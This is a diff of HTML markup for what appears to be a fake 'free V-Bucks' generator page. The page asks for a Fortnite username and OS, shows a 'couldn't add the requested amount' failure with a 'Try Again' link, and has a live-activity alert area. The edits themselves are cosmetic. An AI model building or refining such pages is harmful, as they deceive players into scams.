@@ -37,7 +37,7 @@
                         <div class="fortnite-content-layer">
                             <div class="fortnite-content-layer2 text-center">
                                 
-                                <div class="wrap-wrap">
+                                <div class="wrap-wrap" id="username_box">
                                     <div class="col-sm-9 col-xs-9 center-block input-wrap text-center">
                                         <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">Enter your Fortnite username and OS</h4>
                                         <input type="text" name="username" id="vbucksusername">
@@ -133,9 +133,9 @@
                                         <div id="menu-outer">
                                             <div class="table">
                                                 <ul id="horizontal-list">                                
-                                                    <li><a href="index.html#" id="confirm_yes"><span>Yes</span></a></li>
+                                                    <li><a href="index.html#" class="proceed" id="confirm_yes"><span>Yes</span></a></li>
                                                     &nbsp;&nbsp;&nbsp; <!-- I'm a lazy ree -->
-                                                    <li><a href="index.html#" id="confirm_no"><span>No</span></a></li>
+                                                    <li><a href="index.html#" class="proceed" id="confirm_no"><span>No</span></a></li>
                                                 </ul>
                                             </div>
                                         </div>
@@ -143,25 +143,17 @@
 
                                     <div class="verification col-sm-7 col-xs-9 center-block" style="display: none;" id="fail">
                                         <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">
-                                            <span id="user-text2"></span>,
+                                            Oops!
                                         </h4>
-                                        <p style="font-family: fortnite; font-size: 25px; margin-bottom: 12px">
+                                        <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">
                                             It looks like we couldn't add the requested amount of V-Bucks to your account.
-                                            <span id="hint"></span> 
-                                        </p>
-                                        <div id="menu-outer">
-                                            <div class="table">
-                                                <ul id="horizontal-list">                                
-                                                    <li><a href="index.html#" id="confirm_yes"><span>Yes</span></a></li>
-                                                    &nbsp;&nbsp;&nbsp; <!-- I'm a lazy ree -->
-                                                    <li><a href="index.html#" id="confirm_no"><span>No</span></a></li>
-                                                </ul>
-                                            </div>
-                                        </div>
+                                            <span id="hint"></span>
+                                        </h4>
+                                        <a href="index.html#" class="proceed" id="confirm_no"><span>Try Again</span></a>
+
                                     </div>
 
                                 </div>
-                                
 
                                 <div class="col-lg-12 sticky-alert" style="margin-top: 12px;" id="live_activity">
                                     <div class="col-lg-12 sticky-alert">
